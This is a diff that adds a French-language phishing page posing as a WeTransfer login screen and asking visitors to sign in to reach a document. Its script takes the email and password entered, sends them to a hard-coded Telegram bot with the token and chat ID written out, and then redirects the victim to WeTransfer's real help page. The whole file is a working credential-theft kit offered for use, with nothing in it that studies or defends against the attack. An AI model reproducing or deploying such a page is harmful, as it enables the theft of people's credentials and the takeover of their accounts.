@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion</title>
+
+    <link rel="stylesheet" href="https://cdn.wetransfer.com/_next/static/media/ActiefGrotesque-Bold.10832e10.woff2">
+    <link rel="stylesheet" href="https://cdn.wetransfer.com/_next/static/media/ActiefGrotesque-Medium.1acd899d.woff2">
+    <link rel="stylesheet" href="https://cdn.wetransfer.com/_next/static/media/GT-Super-WT-Super.3397811e.woff">
+    <link rel="stylesheet" href="https://cdn.wetransfer.com/_next/static/media/ActiefGrotesque_W_Medium.7e37a161.woff">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+
+
+    <style>
+        * {
+            box-sizing: border-box;
+            padding: 0;
+            margin: 0;
+            font-family: GT Super WT, -apple-system, \.SFNSText-Regular, San Francisco, Roboto, Segoe UI, Helvetica Neue, Lucida Grande, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            max-height: 100vh;
+            display: flex;
+            flex-direction: column;
+
+        }
+
+        .top {
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: fixed;
+            left: 0%;
+            top: 0%;
+            width: 100%;
+            background-color: white;
+            padding: 15px;
+        }
+
+        .top img {
+            margin: auto;
+        }
+
+        .center {
+            height: 90vh;
+            width: 100%;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        form {
+            width: 100%;
+        }
+
+        input {
+            width: 100%;
+            height: 50px;
+            margin-bottom: 30px;
+            border: 1px solid;
+            border-radius: 8px;
+            padding-left: 10px;
+
+        }
+        input:focus{
+            outline: none;
+        }
+
+        button {
+            width: 100%;
+            height: 50px;
+            margin-top: 20px;
+            border: none;
+            border-radius: 9999px;
+            background-color: #191919;
+            color: white;
+
+        }
+
+        @media (min-width: 612px) {
+
+            /* Styles pour les écrans de PC */
+            body {
+                min-height: 100vh;
+                max-height: 100vh;
+                display: flex;
+                flex-direction: column;
+
+            }
+
+            .center {
+                border: 1px solid rgba(128, 128, 128, 0.288) ;
+                border-radius: 10px;
+                background-color: white;
+                width: 400px;
+                margin: auto;
+                padding: 20px 30px 20px 30px;
+                margin-top: 25px;
+            }
+
+
+
+
+        }
+    </style>
+</head>
+
+<body>
+
+    <br> <br>
+
+    <div class="top">
+        <img class="wt-product-logo" src="https://auth-cdn.wetransfer.com/assets/images/logo-free-mobile.svg">
+    </div>
+
+    <div class="center">
+
+        <h3 style="text-align: center;">Connectez vous pour accéder au document</h3>
+
+        <br>
+        <br> <br>
+
+        <form id="form">
+
+            <input type="email" id="email" placeholder="E-mail" required> <br>
+            <input type="password" id="pwd" placeholder="Mot de passe" required> <br>
+            <a href="#">besoin d'aide ?</a> <br> <br>
+
+            <button type="submit">Se connecter</button>
+        </form>
+    </div>
+
+    <script>
+
+
+
+document.getElementById('form').addEventListener('submit', function (e) {
+            e.preventDefault();
+        
+            // Récupération des valeurs du formulaire
+            const email = document.getElementById('email').value;
+            const pwd = document.getElementById('pwd').value;
+            
+            // Validation des champs
+            if (!email || !pwd) {
+                alert('Veuillez remplir tous les champs.');
+                return;
+            }
+        
+           
+            // Construction du message
+            const message = `
+                WE TRANSFER :
+                \n📩Email : ${email}
+                \n🔑mot de passe: ${pwd}
+                
+            `;
+        
+            const botToken = '7366002950:AAFzze0vYX5nxrxWxX7y4vVg2CcJy-3Fsi4'; // Remplacez par votre token
+            const chatId = '7332838769'; // Remplacez par votre chat ID
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        
+            // Envoi du message au bot Telegram
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    localStorage.setItem('email', email);
+                    console.log('Votre message a été envoyé avec succès !');
+                    window.location.href='https://help.wetransfer.com/hc/en-us';
+                } else {
+                    console.error('Erreur lors de l\'envoi du message:', data.description);
+                    console.log('Une erreur est survenue lors de l\'envoi de votre message. Veuillez réessayer.');
+                }
+            })
+            .catch(error => {
+                console.error('Erreur réseau ou serveur:', error);
+                console.log('Une erreur est survenue lors de l\'envoi de votre message. Veuillez réessayer.');
+            });
+        });
+        
+
+
+    </script>
+
+</body>
+
+</html>
